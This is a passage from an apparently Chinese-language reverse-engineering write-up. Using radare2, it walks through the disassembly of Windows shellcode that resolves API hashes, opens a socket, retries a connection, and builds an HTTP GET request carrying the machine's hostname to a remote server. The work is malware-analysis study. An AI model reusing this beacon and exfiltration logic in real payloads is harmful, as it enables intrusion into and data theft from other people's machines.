   |  |     <span class="number">0x00000078</span>    8b048b       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   |  |     <span class="number">0x0000007b</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000007d</span>    <span class="number">89442424</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x24</span>], <span class="literal">eax</span>
   |  |     <span class="number">0x00000081</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000082</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000083</span>    <span class="number">61</span>           <span class="keyword">popad</span>
   |  |     <span class="number">0x00000084</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000085</span>    5a           <span class="keyword">pop</span> <span class="literal">edx</span>
   |  |     <span class="number">0x00000086</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000087</span>    ffe0         <span class="keyword">jmp</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000089</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  <span class="string">`---&gt; 0x0000008a    5f           pop edi
   |        0x0000008b    5a           pop edx
   |        0x0000008c    8b12         mov edx, [edx]
   `</span>======&lt; <span class="number">0x0000008e</span>    eb86         <span class="keyword">jmp</span> <span class="number">0x16</span>
</code></pre><p>首先</p>
<pre><code><span class="keyword">pushad</span>
<span class="keyword">cld</span>
</code></pre><p>将寄存器内容保存在堆栈上并清空寄存器内容。</p>
<p>然后可以看到从<code>0x00000002</code>调用<code>0x00000091</code>。那从<code>0x00000007</code>开始是啥？参考之前stephen的函数解析器，一直到<code>0x0000008e</code>都是解析器。唉？<code>0x90</code>是啥？到<code>0x00000091</code>开始：</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pD @<span class="number">0x91</span>
            <span class="number">0x00000091</span>    <span class="number">5d</span>           <span class="keyword">pop</span> <span class="literal">ebp</span>
            <span class="number">0x00000092</span>    81bde902000. <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
        ,=&lt; <span class="number">0x0000009c</span>    <span class="number">7570</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
        |   <span class="number">0x0000009e</span>    8d85d1020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d1</span>]
        |   <span class="number">0x000000a4</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
        |   <span class="number">0x000000a5</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
        |   <span class="number">0x000000aa</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
        |      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk, unk)
        |   <span class="number">0x000000ac</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
       ,==&lt; <span class="number">0x000000ae</span>    745e         <span class="keyword">je</span> <span class="number">0x10e</span>
       ||   <span class="number">0x000000b0</span>    8d85d8020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d8</span>]
       ||   <span class="number">0x000000b6</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
       ||   <span class="number">0x000000b7</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
       ||   <span class="number">0x000000bc</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
       ||      <span class="number">0x00000000</span>(unk, unk)
       ||   <span class="number">0x000000be</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
      ,===&lt; <span class="number">0x000000c0</span>    744c         <span class="keyword">je</span> <span class="number">0x10e</span>
      |||   <span class="number">0x000000c2</span>    bb90010000   <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="number">0x190</span> <span class="comment">;  0x00000190 </span>
      |||   <span class="number">0x000000c7</span>    29dc         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000c9</span>    <span class="number">54</span>           <span class="keyword">push</span> <span class="literal">esp</span>
      |||   <span class="number">0x000000ca</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
      |||   <span class="number">0x000000cb</span>    6829806b00   <span class="keyword">push</span> <span class="number">0x6b8029</span> <span class="comment">;  0x006b8029 </span>
      |||   <span class="number">0x000000d0</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
      |||      <span class="number">0x00000000</span>(unk, unk, unk)
      |||   <span class="number">0x000000d2</span>    01dc         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000d4</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
     ,====&lt; <span class="number">0x000000d6</span>    <span class="number">7536</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
     ||||   <span class="number">0x000000d8</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000d9</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000da</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000db</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dc</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dd</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000de</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000df</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000e0</span>    68ea0fdfe0   <span class="keyword">push</span> <span class="number">0xe0df0fea</span> <span class="comment">;  0xe0df0fea </span>
     ||||   <span class="number">0x000000e5</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
     ||||      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk)
     ||||   <span class="number">0x000000e7</span>    31<span class="pseudo">db</span>         <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
     ||||   <span class="number">0x000000e9</span>    f7d3         <span class="keyword">not</span> <span class="literal">ebx</span>
     ||||   <span class="number">0x000000eb</span>    39c3         <span class="keyword">cmp</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
    ,=====&lt; <span class="number">0x000000ed</span>    741f         <span class="keyword">je</span> <span class="number">0x10e</span>
    |||||   <span class="number">0x000000ef</span>    89c3         <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
  .-------&gt; <span class="number">0x000000f1</span>    6a10         <span class="keyword">push</span> <span class="number">0x10</span> <span class="comment">;  0x00000010 </span>
  | |||||   <span class="number">0x000000f3</span>    8db5e1020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e1</span>]
  | |||||   <span class="number">0x000000f9</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  | |||||   <span class="number">0x000000fa</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
  | |||||   <span class="number">0x000000fb</span>    6899a57461   <span class="keyword">push</span> <span class="number">0x6174a599</span> <span class="comment">;  0x6174a599 </span>
  | |||||   <span class="number">0x00000100</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
  | |||||      <span class="number">0x00000000</span>(unk, unk, unk, unk)
  | |||||   <span class="number">0x00000102</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  |,======&lt; <span class="number">0x00000104</span>    741f         <span class="keyword">je</span> <span class="number">0x125</span>
  |||||||   <span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
  <span class="string">`=======&lt; 0x0000010c    75e3         jne 0xf1
   |`</span><span class="string">```</span><span class="string">`-&gt; 0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1
  ========&lt; 0x00000115    7407         je 0x11e
   |        0x00000117    e83b010000   call 0x257
   |           0x00000257()
  ========&lt; 0x0000011c    eb05         jmp 0x123
  --------&gt; 0x0000011e    e84d010000   call 0x270
          &gt;    0x00000270()
  --------&gt; 0x00000123    ffe7         jmp edi
   `</span>------&gt; <span class="number">0x00000125</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
            <span class="number">0x0000012a</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
            <span class="number">0x0000012c</span>    89e2         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">esp</span>
            <span class="number">0x0000012e</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x0000012f</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
            <span class="number">0x00000130</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x00000131</span>    68b649de01   <span class="keyword">push</span> <span class="number">0x1de49b6</span> <span class="comment">;  0x01de49b6 </span>
            <span class="number">0x00000136</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
               <span class="number">0x00000000</span>(unk, unk, unk, unk)
            <span class="number">0x00000138</span>    5f           <span class="keyword">pop</span> <span class="literal">edi</span>
            <span class="number">0x00000139</span>    81c400010000 <span class="keyword">add</span> <span class="literal">esp</span>, <span class="number">0x100</span>
            <span class="number">0x0000013f</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  ========&lt; <span class="number">0x00000141</span>    0f85f2000000 <span class="keyword">jne</span> <span class="number">0x239</span>
            <span class="number">0x00000147</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
            <span class="number">0x00000148</span>    e8f9000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>(unk)
            <span class="number">0x0000014d</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000014e</span>    89ca         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">ecx</span>
            <span class="number">0x00000150</span>    8dbde9020000 <span class="keyword">lea</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e9</span>]
            <span class="number">0x00000156</span>    e8eb000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>()
            <span class="number">0x0000015b</span>    4f           <span class="keyword">dec</span> <span class="literal">edi</span>
            <span class="number">0x0000015c</span>    83fa20       <span class="keyword">cmp</span> <span class="literal">edx</span>, <span class="number">0x20</span>
  ========&lt; <span class="number">0x0000015f</span>    7c05         <span class="keyword">jl</span> <span class="number">0x166</span>
            <span class="number">0x00000161</span>    ba20000000   <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="number">0x20</span> <span class="comment">;  0x00000020 </span>
  --------&gt; <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
            <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
            <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
            <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
            <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
            <span class="number">0x0000017e</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000017f</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
            <span class="number">0x00000180</span>    68a9283480   <span class="keyword">push</span> <span class="number">0x803428a9</span> <span class="comment">;  0x803428a9 </span>
            <span class="number">0x00000185</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
</code></pre><p>首先<code>pop ebp</code>将解析器的地址弹入<code>ebp</code>，<code>ebp</code>就指向了所有解析器，显然，之后的一些长十六机制书就是windows API函数的哈希了。我们查查表、跟跟执行流程、看看四处的数据，做做注释，就知道大致怎么回事了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host:
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d1</span>
ws2_32
[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d8</span>
IPHLPAPI
</code></pre><p>当看到一大堆往<code>0x0000010e</code>的类似跳转，猜测大概是处理出错的函数吧，可以注释之。</p>
<p>在函数调用之前(<code>0x0000092</code>)还有个自检查</p>
<pre><code><span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
<span class="keyword">jne</span> <span class="number">0x10e</span>
</code></pre><p>我们可以看到是看<code>ebp+0x2e9</code>指向的是不是以<code>GET</code>开头：</p>
<pre><code><span class="special">~</span> ⮀ print "<span class="command">\x</span>20<span class="command">\x</span>54<span class="command">\x</span>45<span class="command">\x</span>47"
TEG
</code></pre><p>最后获得的是一个标准的shellcode建立socket流程:</p>
<ol>
<li>通过<code>kernel.dll!LoadlibraryA</code>载入相应dll(<code>ws2_32</code>),这里还载入了<code>IPHLPAPI</code></li>
<li><code>ws2_32.dll!WSAStartup</code>初始化socket</li>
<li><code>ws2_32.dll!WSASocketA</code>建立socket</li>
<li><code>ws2_32.dll!connect</code>连接socket</li>
</ol>
<p>connect返回0时说明连接成功，那么可以知道<code>0x00000104</code>地方的<code>je 0x125</code>跳往的地方应该就是连接成功后要执行的位置了。可以注释下。</p>
<p>注意之后的</p>
<pre><code><span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
<span class="number">0x0000010c</span>    75e3         <span class="keyword">jne</span> <span class="number">0xf1</span>
</code></pre><p><code>ebp+0x89=0x90</code>，这也是我发现不知道是什么的一个字节。根据紧随其后的一个跳转来看，是一个计数器，看样子是尝试连接5次</p>
<pre><code>[<span class="number">0x00000090</span>]&gt; px <span class="number">1</span>@<span class="number">0x7</span>+<span class="number">0x89</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x00000090</span>  <span class="number">05</span>
</code></pre><p>如果5次connect都失败了，没有跳转到<code>0x125</code>, 就到了<code>0x10e</code>，就是我们猜测是错误处理的部分。</p>
<pre><code>[<span class="number">0x00000256</span>]&gt; pd <span class="number">10</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>()
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
</code></pre><p>把<code>0x256</code>的字节和1做比较，相等则调用<code>0x270</code>再执行<code>0x123</code>，否则调用<code>0x257</code>然后再跳到<code>0x123</code>。</p>
<p>不知道判断了什么。</p>
<p>我们先看看<code>0x257</code>吧</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
</code></pre><p>载入<code>0x7+0x2e9</code>然后调用<code>0x246</code></p>
<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 

[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x246</span>
           <span class="number">0x00000246</span>    <span class="number">31</span>c9         xor ecx, ecx
           <span class="number">0x00000248</span>    f7d1         not ecx
           <span class="number">0x0000024a</span>    <span class="number">31</span>c0         xor eax, eax
           <span class="number">0x0000024c</span>    f2ae         repne scasb
           <span class="number">0x0000024e</span>    f7d1         not ecx
           <span class="number">0x00000250</span>    <span class="number">49</span>           dec ecx
           <span class="number">0x00000251</span>    c3           ret
</code></pre><p><code>0x246</code>，中<code>repne scasb</code>常常用来计算字符串长度。仔细看其实<code>0x246</code>就是<code>strlen</code>。计算结果在<code>ecx</code>中,<code>edi</code>此时指向字符串<code>\0</code>下一个字节。</p>
<p>所以回到<code>0x257</code>:</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x00000262</span>    <span class="number">4f</span>           dec edi
           <span class="number">0x00000263</span>    b94f000000   mov ecx, <span class="number">0x4f</span> ;  <span class="number">0x0000004f</span> 
           <span class="number">0x00000268</span>    <span class="number">8</span>db575020000 lea esi, [ebp+<span class="number">0x275</span>]
           <span class="number">0x0000026e</span>    f3a4         rep movsb
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>首先<code>edi</code>减1指向字符串<code>\0</code>位置。</p>
<pre><code><span class="special">[</span>0x00000000<span class="special">]</span>&gt; ps @0x7+0x275
<span class="command">\x</span>0d
Connection: keep-alive<span class="command">\x</span>0d
Accept: */*<span class="command">\x</span>0d
Accept-Encoding: gzip<span class="command">\x</span>0d
<span class="command">\x</span>0d
</code></pre><p>将两个字符串结合起来了。shellcode改变了自己，可以通过<code>ebp+0x2e9</code>获得新的HTTP报头.</p>
<p>难道标志位不相等就构造报头？然后跳转到报头后下一位，我们稍微计算下发现跳转到一堆<code>00</code>上，崩掉了……</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; y <span class="number">0x4f</span> @<span class="number">0x7</span>+<span class="number">0x275</span>
[<span class="number">0x00000000</span>]&gt; e io.cache=<span class="literal">true</span>
[<span class="number">0x00000000</span>]&gt; yy <span class="number">0x32a</span>
[<span class="number">0x00000000</span>]&gt; px @<span class="number">0x32a</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0000032a</span>  <span class="number">0</span>d0a <span class="number">436f</span> <span class="number">6e6</span>e <span class="number">6563</span> <span class="number">7469</span> <span class="number">6f</span>6e <span class="number">3</span>a20 <span class="number">6</span>b65  ..Connection: ke
<span class="number">0x0000033a</span>  <span class="number">6570</span> <span class="number">2</span>d61 <span class="number">6</span>c69 <span class="number">7665</span> <span class="number">0</span>d0a <span class="number">4163</span> <span class="number">6365</span> <span class="number">7074</span>  ep-alive..Accept
<span class="number">0x0000034a</span>  <span class="number">3</span>a20 <span class="number">2</span>a2f <span class="number">2</span>a0d <span class="number">0</span>a41 <span class="number">6363</span> <span class="number">6570</span> <span class="number">742</span>d <span class="number">456</span>e  : *<span class="comment">/*..Accept-En
0x0000035a  636f 6469 6e67 3a20 677a 6970 0d0a 0d0a  coding: gzip....
0x0000036a  0083 c70e 31c9 f7d1 31c0 f3ae 4fff e700  ....1...1...O...
0x0000037a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000038a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0000039a  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003aa  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x000003ba  0090 ffff ffff ffff ffff ffff ffff ffff  ................</span>
</code></pre><p>回到<code>0x10e</code>，我们再看看<code>0x270</code>, 标志位为1发生什么。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt;  pd <span class="number">3</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret


[<span class="number">0x00000000</span>]&gt;  pd <span class="number">6</span>@<span class="number">0x10e</span>
           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
       |      <span class="number">0x00000257</span>(unk)
      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
      || &gt;    <span class="number">0x00000270</span>()
      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi


[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x270</span>
           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
              <span class="number">0x00000246</span>()
           <span class="number">0x0000027b</span>    c3           ret
</code></pre><p>What?计算下报头长度，然后直接跳过去崩掉……</p>
<p>反正只要<code>connect</code>失败就崩了……只不过崩之前干的事情不同，不知道<code>ebp+0x24f</code>是判断啥的标志位。</p>
<p>Ok, 如果<code>connect</code>成功连接。</p>
<pre><code><span class="number">0x00000104</span>    <span class="number">741f</span>         je <span class="number">0x125</span>
</code></pre><p>我们可以看到，从<code>0x125</code>就是<code>gethostname</code>了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span> @<span class="number">0x125</span>
           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
           <span class="number">0x0000012f</span>    <span class="number">50</span>           push eax
           <span class="number">0x00000130</span>    <span class="number">52</span>           push edx
           <span class="number">0x00000131</span>    <span class="number">68</span>b649de01   push <span class="number">0x1de49b6</span> ;  <span class="number">0x01de49b6</span> 
           <span class="number">0x00000136</span>    ffd5         call ebp

exercise ● ⮀ python hash.py ws2_32.dll gethostname
[+] Ran on Sat Aug <span class="number">16</span> <span class="number">20</span>:<span class="number">23</span>:<span class="number">44</span> <span class="number">2014</span>

[+] <span class="number">0x01DE49B6</span> = ws2_32.dll!gethostname
</code></pre><p><code>gethostname</code>的结果写入<code>edi</code>中，接着判断如果失败跳到<code>0x239</code>去，不知道是啥。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x239</span>
       |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
       |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
       |   <span class="number">0x0000023f</span>    ffd5         call ebp
       |      <span class="number">0x00000000</span>(unk, unk, unk) ; name
</code></pre><p>这个hash是<code>&quot;ws2_32.dll!closesocket&quot;</code>那么就很显然是关闭socket的函数了.</p>
<p>我们回到之前<code>gethostname</code>地方：</p>
<pre><code>  ,=&lt; <span class="number">0x00000141</span>    <span class="number">0f</span>85f2000000 jne <span class="number">0x239</span>
 |   <span class="number">0x00000147</span>    <span class="number">57</span>           push edi
 |   <span class="number">0x00000148</span>    e8f9000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>(unk) ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000014d</span>    <span class="number">5</span>e           pop esi
 |   <span class="number">0x0000014e</span>    <span class="number">89</span>ca         mov edx, ecx
 |   <span class="number">0x00000150</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
 |   <span class="number">0x00000156</span>    e8eb000000   call <span class="number">0x246</span>
 |      <span class="number">0x00000246</span>() ; <span class="built_in">strlen</span>
 |   <span class="number">0x0000015b</span>    <span class="number">4f</span>           dec edi
 |   <span class="number">0x0000015c</span>    <span class="number">83f</span>a20       cmp edx, <span class="number">0x20</span>
,==&lt; <span class="number">0x0000015f</span>    <span class="number">7</span>c05         jl <span class="number">0x166</span>
</code></pre><p>接下来，又是计算字符串长度，判断之前<code>gethostname</code>结果是否等于32,如果比32小则跳转到<code>0x166</code>, 如果大于32则将edx设置成32。而<code>0x166</code>开始又是之前我们分析过的拼接字符串的部分。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">7</span>@<span class="number">0x166</span>
           <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
           <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
           <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
           <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
           <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
           <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
</code></pre><p>就是把<code>gethostname</code>的结果拼接到<code>HOST</code>字段上。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2c4</span>
\x0d
Cookie: ID=ws2_32
[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
Host: 
</code></pre><p>同时<code>gethostname</code>获取的结果保存到堆栈上，最后弹出，调用<code>gethostbyname</code>。</p>
<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">10</span>@<span class="number">0x179</span>
           <span class="number">0x00000179</span>    bd4b020000   mov ebp, <span class="number">0x24b</span> ;  <span class="number">0x0000024b</span> 
           <span class="number">0x0000017e</span>    <span class="number">5</span>e           pop esi
           <span class="number">0x0000017f</span>    <span class="number">56</span>           push esi
           <span class="number">0x00000180</span>    <span class="number">68</span>a9283480   push <span class="number">0x803428a9</span> ;  <span class="number">0x803428a9</span> 
           <span class="number">0x00000185</span>    ffd5         call ebp
              <span class="number">0x00000000</span>(unk, unk) ; name
           <span class="number">0x00000187</span>    <span class="number">85</span>c0         test eax, eax

% python hash.py ws2_32.dll gethostbyname
[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">21</span> <span class="number">2014</span>

[+] <span class="number">0x803428A9</span> = ws2_32.dll!gethostbyname
